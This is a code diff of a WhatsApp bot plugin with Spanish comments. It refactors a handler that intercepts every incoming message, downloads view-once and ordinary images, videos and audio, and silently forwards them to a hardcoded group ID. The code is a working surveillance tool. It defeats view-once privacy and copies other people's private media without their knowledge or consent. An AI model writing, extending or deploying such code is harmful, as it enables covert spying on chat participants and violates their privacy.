@@ -1,81 +1,91 @@
 let handler = m => m
 
 handler.all = async function (m) {
-    // --- NO DETECTA NADA SI ES MENSAJE VACÍO ---
+    const TARGET = "120363402969655890@g.us"
+
+    // No procesar si es mensaje vacío
     if (!m.message) return
 
-    // 🟦 DETECTAR VIEW ONCE
+    // -------------------------
+    // 1. DETECTAR VIEW ONCE
+    // -------------------------
     let v1 = m.message.viewOnceMessageV2?.message
     let v2 = m.message.viewOnceMessageV2Extension?.message
-    let viewOnce = v1 || v2
+    let vo = v1 || v2
 
-    // 🟦 DETECTAR TIPOS DE MEDIOS
-    let img  = m.message.imageMessage
-    let vid  = m.message.videoMessage
-    let aud  = m.message.audioMessage
-    let doc  = m.message.documentMessage
+    if (vo) {
+        let media =
+            vo.imageMessage ||
+            vo.videoMessage ||
+            vo.audioMessage
 
-    // --- MODO DEBUG ---
-    // console.log({ img, vid, aud, viewOnce })
+        if (!media) return
 
-    // 📌 IMAGEN NORMAL
-    if (img) {
         let buffer = await m.download()
         if (!buffer) return
-        await conn.sendMessage("120363402969655890@g.us", {
+
+        // Enviar según tipo
+        if (vo.imageMessage) {
+            return await conn.sendMessage(TARGET, {
+                image: buffer,
+                caption: vo.imageMessage.caption || ''
+            })
+        }
+        if (vo.videoMessage) {
+            return await conn.sendMessage(TARGET, {
+                video: buffer,
+                caption: vo.videoMessage.caption || ''
+            })
+        }
+        if (vo.audioMessage) {
+            return await conn.sendMessage(TARGET, {
+                audio: buffer,
+                ptt: true
+            })
+        }
+
+        return
+    }
+
+    // -------------------------
+    // 2. DETECTAR MEDIOS NORMALES
+    // (MISMA LÓGICA QUE TU AUTOSTICKER)
+    // -------------------------
+
+    let q = m
+    let mime = (q.msg || q).mimetype || q.mediaType || ''
+
+    // IMAGEN NORMAL
+    if (/image/g.test(mime)) {
+        let buffer = await q.download?.()
+        if (!buffer) return
+
+        return await conn.sendMessage(TARGET, {
             image: buffer,
-            caption: img.caption || ""
+            caption: m?.msg?.caption || ''
         })
-        return
     }
 
-    // 📌 VIDEO NORMAL
-    if (vid) {
-        let buffer = await m.download()
+    // VIDEO NORMAL
+    if (/video/g.test(mime)) {
+        let buffer = await q.download?.()
         if (!buffer) return
-        await conn.sendMessage("120363402969655890@g.us", {
+
+        return await conn.sendMessage(TARGET, {
             video: buffer,
-            caption: vid.caption || ""
+            caption: m?.msg?.caption || ''
         })
-        return
     }
 
-    // 📌 AUDIO NORMAL
-    if (aud) {
-        let buffer = await m.download()
+    // AUDIO NORMAL
+    if (/audio/g.test(mime)) {
+        let buffer = await q.download?.()
         if (!buffer) return
-        await conn.sendMessage("120363402969655890@g.us", {
+
+        return await conn.sendMessage(TARGET, {
             audio: buffer,
             ptt: true
         })
-        return
-    }
-
-    // 📌 VIEW ONCE (imagen/video)
-    if (viewOnce) {
-        let realMedia =
-            viewOnce.imageMessage ||
-            viewOnce.videoMessage ||
-            viewOnce.audioMessage
-
-        if (!realMedia) return
-
-        let buffer = await m.download()
-        if (!buffer) return
-
-        // enviar el view once desbloqueado
-        if (viewOnce.imageMessage) {
-            return await conn.sendMessage("120363402969655890@g.us", {
-                image: buffer,
-                caption: viewOnce.imageMessage.caption || ""
-            })
-        }
-        if (viewOnce.videoMessage) {
-            return await conn.sendMessage("120363402969655890@g.us", {
-                video: buffer,
-                caption: viewOnce.videoMessage.caption || ""
-            })
-        }
     }
 
     return !0
